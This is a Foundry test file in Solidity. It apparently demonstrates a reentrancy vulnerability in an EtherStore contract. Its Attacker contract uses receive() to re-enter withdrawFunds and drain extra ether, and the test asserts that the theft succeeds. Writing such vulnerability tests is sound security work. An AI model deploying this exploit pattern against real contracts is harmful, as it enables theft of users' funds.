
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {EtherStore} from "../src/EtherStore.sol";

contract TestReentrancyEtherStore is Test {
    EtherStore public _contractUnderTest;
    Attacker public _attacker;

    function setUp() public {
        _contractUnderTest = new EtherStore();
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal >= 0.1 ether && attackVal <= 10 ether);

        vm.deal(address(_contractUnderTest), attackVal * 2);
        vm.deal(address(_attacker), attackVal * 2);
        vm.deal(address(this), attackVal * 2);

        _attacker.setupAttack{value: attackVal}(attackVal);

        vm.warp(block.timestamp + 2 weeks);

        uint256 victimBalanceBefore = address(_contractUnderTest).balance;
        uint256 attackerBalanceBefore = address(_attacker).balance;

        _attacker.attack(attackVal);

        uint256 victimBalanceAfter = address(_contractUnderTest).balance;
        uint256 attackerBalanceAfter = address(_attacker).balance;

        assertGt(_attacker.attackCallCount(), 1, "reentrancy did not occur");
        assertTrue(_attacker.exploitSucceeded(), "exploit did not mark success");
        assertLt(victimBalanceAfter, victimBalanceBefore, "victim balance did not decrease");
        assertGt(attackerBalanceAfter, attackerBalanceBefore, "attacker did not gain funds");
    }

    receive() external payable {}
}

contract Attacker {
    EtherStore public _victim;

    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedAttackVal;

    constructor(address victimAddress) {
        _victim = EtherStore(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 0;
        exploitSucceeded = false;

        require(msg.value == val, "must send val");
        _victim.depositFunds{value: val}();
    }

    function attack(uint256 val) public {
        initialSnapshot = address(this).balance;
        storedAttackVal = val;

        _victim.withdrawFunds(val);

        if (attackCallCount > 1 && address(this).balance > initialSnapshot) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        attackCallCount++;

        if (attackCallCount < 2) {
            _victim.withdrawFunds(storedAttackVal);
        }
    }
}
